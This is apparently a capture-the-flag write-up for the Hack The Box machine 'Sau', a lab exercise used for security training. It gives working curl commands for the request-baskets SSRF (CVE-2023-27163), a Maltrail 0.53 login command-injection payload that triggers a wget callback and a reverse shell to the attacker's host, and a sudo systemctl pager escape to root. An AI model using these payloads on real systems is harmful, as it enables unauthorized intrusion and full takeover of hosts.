# nmap
```
# Nmap 7.93 scan initiated Fri Jul 21 15:06:23 2023 as: nmap -p- -Pn -sC -sV -T4 -oN nmap.txt -vvvv 10.10.11.224
Increasing send delay for 10.10.11.224 from 0 to 5 due to 55 out of 137 dropped probes since last increase.
Warning: 10.10.11.224 giving up on port because retransmission cap hit (6).
Nmap scan report for sau.htb (10.10.11.224)
Host is up, received user-set (0.72s latency).
Scanned at 2023-07-21 15:06:23 EDT for 2446s
Not shown: 65518 closed tcp ports (conn-refused)
PORT      STATE    SERVICE      REASON      VERSION
22/tcp    open     ssh          syn-ack     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa8867d7133d083a8ace9dc4ddf3e1ed (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdY38bkvujLwIK0QnFT+VOKT9zjKiPbyHpE+cVhus9r/6I/uqPzLylknIEjMYOVbFbVd8rTGzbmXKJBdRK61WioiPlKjbqvhO/YTnlkIRXm4jxQgs+xB0l9WkQ0CdHoo/Xe3v7TBije+lqjQ2tvhUY1LH8qBmPIywCbUvyvAGvK92wQpk6CIuHnz6IIIvuZdSklB02JzQGlJgeV54kWySeUKa9RoyapbIqruBqB13esE2/5VWyav0Oq5POjQWOWeiXA6yhIlJjl7NzTp/SFNGHVhkUMSVdA7rQJf10XCafS84IMv55DPSZxwVzt8TLsh2ULTpX8FELRVESVBMxV5rMWLplIA5ScIEnEMUR9HImFVH1dzK+E8W20zZp+toLBO1Nz4/Q/9yLhJ4Et+jcjTdI1LMVeo3VZw3Tp7KHTPsIRnr8ml+3O86e0PK+qsFASDNgb3yU61FEDfA0GwPDa5QxLdknId0bsJeHdbmVUW3zax8EvR+pIraJfuibIEQxZyM=
|   256 ec2eb105872a0c7db149876495dc8a21 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEFMztyG0X2EUodqQ3reKn1PJNniZ4nfvqlM7XLxvF1OIzOphb7VEz4SCG6nXXNACQafGd6dIM/1Z8tp662Stbk=
|   256 b30c47fba2f212ccce0b58820e504336 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICYYQRfQHc6ZlP/emxzvwNILdPPElXTjMCOGH6iejfmi
55555/tcp open     unknown      syn-ack
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Fri, 21 Jul 2023 19:45:43 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Fri, 21 Jul 2023 19:45:01 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Fri, 21 Jul 2023 19:45:04 GMT
|_    Content-Length: 0
```

# CVE-2023-27163 on http://sau.htb:55555
First, let us generate a request basket and obtain our token. After creating our basket, we realize that if a send a curl request to our basket, the site will be able to record our requests (including the headers of the requests)

We are also able to find that we are using requests-baskets v1.2.1 from http://sau.htb:55555/web and we are also able to find that this version of request-basket is vulnerable to [CVE-2023-27163](https://github.com/advisories/GHSA-58g2-vgpg-335q).

There are 2 ways to trigger the SSRF from CVE-2023-27163. The first way would be to modify the *forward_url* when we first create the bucket and afterwards trigger the SSRF by sending a GET request to our basket api Do note that we will have to set *proxy_response* to be True to obtain the response for the SSRF payload

```
┌──(kali㉿kali)-[~]
└─$ curl http://sau.htb:55555/api/baskets/test1234 --data-binary '{"forward_url": "http://10.10.16.8:3000","proxy_response": True,"insecure_tls": false,"expand_path": true,"capacity": 250}'
{"token":"TBXPl--yQ0uaCm4fWlRdhy1exZefNOOJ8RerePUzTu40"}                                                                                                                                                                                                               
┌──(kali㉿kali)-[~]
└─$ curl http://sau.htb:55555/test1234
```

The second way would be to first generate the basket and obtain our token. Afterwards, we can modify the *forward_url* parameter by sending a PUT request to basket api.

```
┌──(pentest)─(kali㉿kali)-[~/Desktop/sau]
└─$ curl http://sau.htb:55555/api/baskets/test123456 --data-binary '{"forward_url": "","proxy_response": true,"insecure_tls": false,"expand_path": true,"capacity": 250}'
{"token":"K0bG_hIg353gVGWFmDiuVxgKV4zeJn-5WBNeG4tEGdAQ"}  

┌──(pentest)─(kali㉿kali)-[~/Desktop/sau]
└─$ curl -XPUT http://sau.htb:55555/api/baskets/test123456 -H 'Authorization: K0bG_hIg353gVGWFmDiuVxgKV4zeJn-5WBNeG4tEGdAQ' --data-binary '{"forward_url": "http://127.0.0.1:80","proxy_response": true,"insecure_tls": false,"expand_path": true,"capacity": 250}'

┌──(pentest)─(kali㉿kali)-[~/Desktop/sau]
└─$ curl http://sau.htb:55555/test123456
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta http-equiv="Content-Type" content="text/html;charset=utf8">
        <meta name="viewport" content="width=device-width, user-scalable=no">
        <meta name="robots" content="noindex, nofollow">
        <title>Maltrail</title>
        <link rel="stylesheet" type="text/css" href="css/thirdparty.min.css">
        <link rel="stylesheet" type="text/css" href="css/main.css">
        <link rel="stylesheet" type="text/css" href="css/media.css">
        <script type="text/javascript" src="js/errorhandler.js"></script>
        <script type="text/javascript" src="js/thirdparty.min.js"></script>
        <script type="text/javascript" src="js/papaparse.min.js"></script>

...
```

Since we are able to exploit an SSRF exploit via CVE-2023-27163, we will test it on all the ports of localhost that we have obtained in our nmap scan previously. From the results, we find out that only port 80 is accessible via the localhost and we are also able to see that Maltrail is running on port 80 of the localhost. Apart from that, we are also able to find the version of Maltrail running to be ```V0.53```

```
┌──(pentest)─(kali㉿kali)-[~/Desktop/sau]
└─$ curl http://sau.htb:55555/test123456 | grep "Powered by"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  7091    0  7091    0     0   6779      0 --:--:--  0:00:01 --:--:--  6779
        <div class="bottom noselect">Powered by <b>M</b>altrail (v<b>0.53</b>)</div>
```

# OS Command Injection on Maltrail
We are able to find an OS Command Injection on Maltrail V0.53 from [here](https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/). Using the POC, we are able to trigger the OS command injection to send a ```wget``` command to the python server on our localhost

```
┌──(pentest)─(kali㉿kali)-[~/Desktop/sau]
└─$ curl 'http://sau.htb:55555/test123456/login' --data 'username=;`wget http://10.10.16.8:3000/test.txt`'
Login failed

┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 3000                        
Serving HTTP on 0.0.0.0 port 3000 (http://0.0.0.0:3000/) ...
10.10.11.224 - - [22/Jul/2023 02:23:41] code 404, message File not found
10.10.11.224 - - [22/Jul/2023 02:23:41] "GET /test.txt HTTP/1.1" 404 -
```

Using the OS command injection, we could create a reverse shell connection to our local listener

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 3000
listening on [any] 3000 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.11.224] 43472
puma@sau:/opt/maltrail$ id && ip addr 
id && ip addr
uid=1001(puma) gid=1001(puma) groups=1001(puma)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:96:83 brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.224/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:9683/64 scope global dynamic mngtmpaddr 
       valid_lft 86394sec preferred_lft 14394sec
    inet6 fe80::250:56ff:feb9:9683/64 scope link 
       valid_lft forever preferred_lft forever
puma@sau:/opt/maltrail$ 
```

# Obtaining user flag

```
puma@sau:/opt/maltrail$ cat /home/puma/user.txt
cat /home/puma/user.txt
<user flag>
puma@sau:/opt/maltrail$ 
```

# Privilege Escalation
Checking the privileges of the current user, we realize that we are able to execute ```/usr/bin/systemctl status trail.service``` with root permissions. 
```
puma@sau:/opt/maltrail$ sudo -l
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

From [GTFO Bins](https://gtfobins.github.io/gtfobins/systemctl/), we are able to escalate our privileges to that of the root permissions

```
puma@sau:/opt/maltrail$ sudo /usr/bin/systemctl status trail.service

sudo /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  (press RETURN)● trail.service - Maltrail. Server of malicious traffic detection system
     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset:>
     Active: active (running) since Fri 2023-07-21 19:03:23 UTC; 12h ago
       Docs: https://github.com/stamparm/maltrail#readme
             https://github.com/stamparm/maltrail/wiki
   Main PID: 893 (python3)
      Tasks: 34 (limit: 4662)
     Memory: 50.8M
     CGroup: /system.slice/trail.service
             ├─ 893 /usr/bin/python3 server.py
             ├─1856 /bin/sh -c logger -p auth.info -t "maltrail[893]" "Failed p>
             ├─1857 /bin/sh -c logger -p auth.info -t "maltrail[893]" "Failed p>
             ├─1860 sh
             ├─1861 python3 -c import socket,os,pty;s=socket.socket(socket.AF_I>
             ├─1862 /bin/sh
             ├─1914 /bin/sh -c logger -p auth.info -t "maltrail[893]" "Failed p>
             ├─1915 /bin/sh -c logger -p auth.info -t "maltrail[893]" "Failed p>
             ├─1918 sh
             ├─1919 python3 -c import socket,os,pty;s=socket.socket(socket.AF_I>
             ├─1920 /bin/bash
             ├─1934 sudo /usr/bin/systemctl status trail.service
             ├─1935 /usr/bin/systemctl status trail.service
             ├─1936 pager
lines 1-23!sh
!sshh!sh
# id && ip addr
id && ip addr
uid=0(root) gid=0(root) groups=0(root)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:96:83 brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.224/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:9683/64 scope global dynamic mngtmpaddr 
       valid_lft 86398sec preferred_lft 14398sec
    inet6 fe80::250:56ff:feb9:9683/64 scope link 
       valid_lft forever preferred_lft forever
# 
```

# Obtaining root flag

```
# cat /root/root.txt
cat /root/root.txt
<root flag>
```
